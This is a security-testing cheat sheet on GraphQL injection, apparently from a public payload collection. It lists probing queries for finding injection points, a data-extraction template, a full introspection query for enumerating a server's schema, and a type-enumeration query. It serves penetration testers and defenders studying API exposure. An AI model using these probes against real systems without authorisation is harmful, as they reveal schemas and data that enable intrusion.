# GraphQL injection

> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data.

## Exploit

### Identify an injection point

```js
example.com/graphql?query={__schema{types{name}}}
```
Check if errors are visible

```javascript
?param={__schema}
?param={}
?param={thisdefinitelydoesnotexist}
```

### Extract data

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

### Enumerate Database Schema with the following GraphQL query

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

### Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

## References

* [Introduction to GraphQL](https://graphql.org/learn/)
* [GraphQL Introspection](https://graphql.org/learn/introspection/)
* [API Hacking GraphQL - @ghostlulz - jun 8, 2019](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
